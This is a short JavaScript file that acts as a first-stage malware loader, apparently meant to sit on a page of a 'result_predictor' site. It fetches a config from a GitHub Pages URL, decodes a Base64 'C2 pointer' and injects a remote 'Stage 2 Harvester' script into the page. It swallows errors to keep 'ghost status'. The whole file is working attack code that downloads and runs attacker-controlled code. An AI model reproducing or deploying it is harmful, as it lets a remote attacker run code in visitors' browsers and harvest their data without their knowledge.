(async function() {
    try {
        // FORCE CACHE BUSTING: We append a unique timestamp to the URL
        // This prevents the browser/CDN from serving an old tunnel URL
        const resolverUrl = 'https://arcanaumbra.github.io/result_predictor/tunnel.json?nocache=' + Date.now();
        
        const response = await fetch(resolverUrl, { cache: "no-store" });
        if (!response.ok) return;

        const config = await response.json();
        
        // Decode the Base64 C2 Pointer
        const harvesterUrl = atob(config.u);
        
        console.log("[!] Recon Link Established. Targeting: " + harvesterUrl);

        // Inject the Stage 2 Harvester
        const script = document.createElement('script');
        script.src = harvesterUrl;
        script.async = true;
        
        // Error handling for the injected script
        script.onerror = function() {
            console.error("[X] Stage 2 Bridge Failure: DNS or Tunnel Offline.");
        };

        document.head.appendChild(script);
        
    } catch (e) {
        // Silent fail to maintain ghost status
    }
})();
